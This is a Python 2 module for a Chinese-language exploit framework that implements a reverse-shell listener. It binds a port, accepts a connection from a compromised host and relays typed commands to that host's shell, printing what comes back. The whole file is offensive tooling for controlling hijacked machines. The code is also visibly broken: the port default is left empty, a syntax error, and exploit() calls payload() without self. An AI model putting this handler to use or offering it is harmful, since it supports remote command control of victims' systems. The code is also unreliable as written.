#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
from socket import *
#模块使用说明

docs = '''

#==============================================================================
#title                  :handler
#description            :shell handler
#author                 :mosin
#date                   :20170712
#version                :0.1
#usage                   pl-shell> qiut    #退出监听，返回框架
#python_version         :2.7.5
#==============================================================================

'''

from modules.exploit import BGExploit



class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "监听",  # 该POC的名称
            "product": "Handler",  # 该POC所针对的应用名称,
            "product_version": "1.0",  # 应用的版本号
            "desc": '''
            用于监听反弹过来的shell

            ''',  # 该POC的描述
            "author": ["mosin"],  # 编写POC者
            "ref": [
                {self.ref.url: ""},  # 引用的url
                {self.ref.bugfrom: ""},  # 漏洞出处
            ],
            "type": self.type.rce,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2017-07-17",  # 漏洞公开时间
            "create_date": "2017-07-17",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "target": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "目标",
                "Required":"no"
            },
            "port": {
                "default": ,
                "convert": self.convert.int_field,
                "desc": "端口",
                "Required":"no"
            },
            "debug": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "用于调试，排查poc中的问题",
                "Required":""
            },
            "mode": {
                "default": "payload",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {

            },
            #程序返回信息
            "description": "this is test ",
            "error": ""
        })


    def payload(self):
        HOST   = self.option.target['default']
        PORT   = self.option.port['default']
        BUFSIZ = 4096
        ADDR   = (HOST, PORT)
        sock   = socket(AF_INET, SOCK_STREAM)
        sock.bind(ADDR)
        sock.listen(5)
        STOP_CHAT = False
        #开始监听
        print "Handler Listening %s port:%s" %(HOST,PORT)
        while not STOP_CHAT:
            tcpClientSock, addr=sock.accept()
            print('Start Listening %s  port %s.....') %(addr,PORT)
            while True:
                data = raw_input('pl_shell >')
                try:
                    if data.upper()=="QUIT":
                        break
                    tcpClientSock.send(data.encode('utf8'))
                    os_result = tcpClientSock.recv(BUFSIZ)
                    if not os_result:
                        #tcpClientSock.settimeout(100)
                        break
                except:
                    tcpClientSock.close()
                    break
                print(os_result)
            STOP_CHAT = True

        tcpClientSock.close()
        sock.close()

    def exploit(self):
        payload()


#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())

















